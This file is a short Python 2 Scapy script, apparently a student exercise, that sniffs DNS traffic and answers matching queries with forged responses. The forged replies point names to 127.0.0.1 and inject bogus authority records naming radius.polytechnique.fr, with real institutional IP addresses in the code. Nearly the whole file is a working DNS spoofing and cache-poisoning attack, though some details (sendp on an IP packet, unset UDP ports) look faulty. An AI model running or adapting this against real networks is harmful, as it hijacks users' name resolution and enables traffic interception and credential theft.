from scapy.all import *

class entier:
    def __init__(self):
        self.val = 0
    def inc(self):
        self.val += 1
i = entier()

"""paquet = sr1(IP(dst='129.104.201.51')/UDP()/DNS(rd=1,qd=DNSQR(qname='radius.polytechnique.fr')))
paquet[IP].src='0.0.0.0'
paquet[IP].dst='0.0.0.0'
paquet[DNS].an[0].rrname='salut.org'
paquet[DNS].an[0].rdata='0.0.0.0'"""
ip_autorite = '1.1.1.1' # change me

def maFonction(a):
    i.inc()
    msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
    if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
        msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
        print msg
        src = a[IP].dst
        dst = a[IP].src
        rrname=a[DNS].qd[0].qname
        id=a[DNS].id
        d = DNS()
        d.qr = 1      #1 for Response
        d.opcode = 16
        d.aa = 0
        d.tc = 0
        d.rd = 0
        d.ra = 1
        d.z = 8
        d.rcode = 0
        d.qdcount = 1      #Question Count
        d.ancount = 1      #Answer Count
        d.nscount = 1      #No Name server info
        d.arcount = 1      #No additional records
        d.qd = str(a[DNS].qd)
        d.an = DNSRR(rrname=rrname, ttl=330, type="A", rclass="IN", rdata="127.0.0.1")
        d.ns = DNSRR(rrname ='129.104.201.53', type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
        d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
        dbis=DNS(qr=d.qr,opcode=d.opcode,aa=d.aa,tc=d.tc,rd=d.rd,ra=d.ra,z=d.z,rcode=d.rcode,qdcount=d.qdcount,ancount=d.ancount,nscount=d.nscount,arcount=d.arcount,qd=a[DNS].qd,an=d.an,ns=d.ns)
        spoofed = IP(src=src, dst=dst)/UDP()/dbis
        sendp(spoofed)
    if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
        msg = msg + ' <-- ANSWER: ' + a[DNS].an[0].rdata
        print msg

        
def monFiltre(x):
    return (x.haslayer(DNS))# and (x[DNS].qr==0L)
    

filtre = sys.argv[1]
sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 60)
